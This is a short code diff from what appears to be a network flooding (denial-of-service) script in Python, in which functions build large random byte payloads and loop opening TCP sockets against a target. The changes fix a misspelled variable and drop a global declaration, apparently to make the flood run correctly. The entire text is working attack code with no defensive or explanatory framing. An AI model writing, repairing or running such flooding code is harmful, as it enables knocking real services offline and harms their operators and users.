@@ -138,7 +138,7 @@ def start2():
   byte3 = random._urandom(40552)
   byte4 = random.choice(acceptall)+random._urandom(23451)
   acceppt = random.choice(socks5)+random.choice(acceptall)
-  byte_host = byte3 + byte4 + accept + "\r\n"
+  byte_host = byte3 + byte4 + acceppt + "\r\n"
   while True:
             try:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -158,7 +158,6 @@ def start2():
   
 def start():
   global useragents, acceptall, ref, socks5
-  global data2
   time.sleep(0.01)
   data2 = random._urandom(75006)
   xx = int(0)
